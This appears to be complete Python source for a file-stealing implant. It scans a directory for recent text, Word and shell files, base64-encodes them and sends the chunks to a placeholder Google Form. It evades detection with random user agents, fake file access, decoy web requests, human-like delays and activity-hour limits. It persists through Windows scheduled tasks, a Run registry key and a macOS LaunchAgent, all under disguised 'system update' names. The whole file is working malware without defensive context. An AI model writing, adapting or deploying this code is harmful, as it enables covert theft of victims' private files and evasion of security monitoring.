import os
import time
import base64
import random
import hashlib
import platform
import requests
import subprocess
import gc
import tempfile

# === CONFIGURATION ===
FORM_URL = "Google_Form_Link"  # Replace with actual form URL
CHUNK_FIELD = 'Filed_ID.0000'  # Replace with form field for chunk index
DATA_FIELD = 'Filed_Id.1111'   # Replace with form field for data
WATCH_DIR = os.path.expanduser("Directory_Of_Your_Choice")  # Directory to watch
FILE_EXTENSIONS = [".txt", ".docx", ".sh"]
MAX_FILES_TO_SCAN = 10

# === FLAGS ===
DEBUG_MODE = True
FAST_TEST_MODE = False

# === TRACK HASHES TO AVOID DUPLICATE PROCESSING ===
SEEN_HASHES = set()

# === PRINT DEBUG MESSAGES ===
def debug(msg):
    if DEBUG_MODE:
        print(f"[DEBUG] {msg}")

# === CALCULATE FILE HASH FOR TRACKING ===
def file_hash(filepath):
    h = hashlib.sha256()
    try:
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                h.update(chunk)
        return h.hexdigest()
    except Exception as e:
        debug(f"Hashing failed: {e}")
        return None

# === POST BASE64 CHUNKS WITH RETRIES ===
def post_chunk(chunk_id: str, data: str, retries=3) -> bool:
    for attempt in range(retries):
        success = _try_post_chunk(chunk_id, data)
        if success:
            return True
        debug(f"POST chunk {chunk_id} failed on attempt {attempt+1}, retrying...")
        time.sleep(random.uniform(2, 5))
    return False

# === ACTUAL POST REQUEST FUNCTION ===
def _try_post_chunk(chunk_id: str, data: str) -> bool:
    try:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        headers = {
            "User-Agent": random.choice(user_agents),
        }
        response = requests.post(
            FORM_URL,
            data={CHUNK_FIELD: chunk_id, DATA_FIELD: data},
            headers=headers,
            timeout=10
        )
        return response.status_code == 200
    except Exception as e:
        debug(f"POST error: {e}")
        return False

# === SIMULATE USER FILE ACCESS TO AVOID DETECTION ===
def mimic_user_access(path):
    try:
        filesize = os.path.getsize(path)
        read_offset = random.randint(0, max(0, filesize - 128)) if filesize > 128 else 0

        with open(path, 'rb') as f:
            f.seek(read_offset)
            f.read(128)

        # Simulate reading another file in the same directory
        watch_dir = os.path.dirname(path)
        try:
            files = [f for f in os.listdir(watch_dir) if os.path.isfile(os.path.join(watch_dir, f))]
            if files:
                random_file = os.path.join(watch_dir, random.choice(files))
                with open(random_file, 'rb') as rf:
                    rf.read(32)
        except Exception:
            pass

        time.sleep(random.uniform(0.5, 3.0))
        os.utime(path, None)  # Update file access time

        debug(f"Mimicked user access on {path}")
    except Exception as e:
        debug(f"Failed to mimic user access on {path}: {e}")

# === SIMULATE BROWSER ACTIVITY TO BLEND IN ===
def fake_browser_activity():
    try:
        system = platform.system()
        if system == "Windows":
            subprocess.Popen(['powershell', '-Command',
                              'Invoke-WebRequest -Uri "https://www.google.com" -UseBasicParsing'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif system == "Darwin" or system == "Linux":
            subprocess.Popen(['curl', '-s', 'https://www.google.com'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        debug("Performed fake browser-like network activity")
        time.sleep(random.uniform(3, 6))
    except Exception as e:
        debug(f"Fake browser activity failed: {e}")

# === ENCODE AND EXFILTRATE FILE CONTENTS IN CHUNKS ===
def exfil_file(filepath):
    try:
        f_hash = file_hash(filepath)
        if not f_hash or f_hash in SEEN_HASHES:
            debug(f"Skipping already seen or unreadable file: {filepath}")
            return

        mimic_user_access(filepath)
        time.sleep(random.uniform(10, 60))  # Human-like delay
        SEEN_HASHES.add(f_hash)

        with open(filepath, 'rb') as f:
            raw_data = f.read()

        offset = 0
        chunk_index = 0
        while offset < len(raw_data):
            chunk_size = random.randint(512, 2048)
            chunk = raw_data[offset:offset+chunk_size]
            encoded = base64.b64encode(chunk).decode()

            if not post_chunk(str(chunk_index).zfill(3), encoded):
                debug(f"Failed to send chunk {chunk_index} for file {filepath}")

            chunk_index += 1
            offset += chunk_size
            time.sleep(random.uniform(2, 6) if not FAST_TEST_MODE else 0.5)

        gc.collect()
        fake_browser_activity()
    except Exception as e:
        debug(f"Exfil error: {e}")
        return

# === SCAN FILESYSTEM FOR TARGET FILE TYPES ===
def scan_files():
    debug(f"Scanning {WATCH_DIR}")
    candidates = []

    for root, _, files in os.walk(WATCH_DIR):
        for f in files:
            if any(f.lower().endswith(ext) for ext in FILE_EXTENSIONS):
                full_path = os.path.join(root, f)
                try:
                    if time.time() - os.path.getmtime(full_path) < 86400:
                        candidates.append(full_path)
                except:
                    continue

    random.shuffle(candidates)
    for path in candidates[:MAX_FILES_TO_SCAN]:
        debug(f"Found: {path}")
        size = os.path.getsize(path)
        time.sleep(random.uniform(1, 3) if size < 100_000 else random.uniform(5, 10))
        exfil_file(path)

# === LIMIT TO HUMAN ACTIVE HOURS (7AM–11PM) ===
def is_human_activity_time():
    hour = time.localtime().tm_hour
    active = 7 <= hour <= 23
    debug(f"Is human activity time? {active} (hour={hour})")
    return active

# === ADD PERSISTENCE (Windows/macOS only) ===
def add_persistence():
    try:
        system = platform.system()
        script_path = os.path.realpath(__file__)

        if system == "Windows":
            task_name = f"SysUpdate_{random.randint(1000,9999)}"
            cmd = f'schtasks /Create /SC ONLOGON /TN {task_name} /TR "{script_path}" /RL HIGHEST /F'
            subprocess.call(cmd, shell=True)
            debug(f"Added Windows scheduled task persistence")

            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SysUpdateRun", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(key)
                debug("Added Windows registry Run key persistence")
            except Exception as e:
                debug(f"Failed to add registry Run key persistence: {e}")

        elif system == "Darwin":
            plist_label = f"com.update.systemcheck{random.randint(1000,9999)}"
            plist = f'''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>{plist_label}</string>
    <key>ProgramArguments</key>
    <array><string>{script_path}</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>
'''
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{plist_label}.plist")
            with open(plist_path, 'w') as f:
                f.write(plist)
            debug(f"Added macOS LaunchAgent persistence with label {plist_label}")

    except Exception as e:
        debug(f"Persistence error: {e}")

# === MAIN EXECUTION LOOP ===
def main():
    add_persistence()
    while True:
        if is_human_activity_time():
            scan_files()
        time.sleep(random.uniform(240, 600) if not FAST_TEST_MODE else 5)

if __name__ == "__main__":
    main()
